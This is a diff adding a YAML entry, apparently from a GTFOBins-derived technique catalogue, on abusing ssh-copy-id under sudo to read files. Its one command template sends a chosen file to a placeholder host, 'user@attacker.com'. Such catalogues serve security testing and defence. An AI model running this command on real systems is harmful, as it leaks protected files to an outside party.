@@ -1,0 +1,26 @@
+id: gtfobins/ssh-copy-id/file-read/sudo
+type: binary
+platform: linux
+name: ssh-copy-id
+phases:
+- collection
+- privilege-escalation
+capabilities:
+- file-read
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com
+  comment: The input file must have the `.pub` file extension. The file will be copied to `~/.ssh/authorized_keys`,
+    otherwise the `-t /path/to/output-file` option can be used.
+references:
+- https://gtfobins.github.io/gtfobins/ssh-copy-id/
+tags:
+- linux
+- unix
+- gtfobins
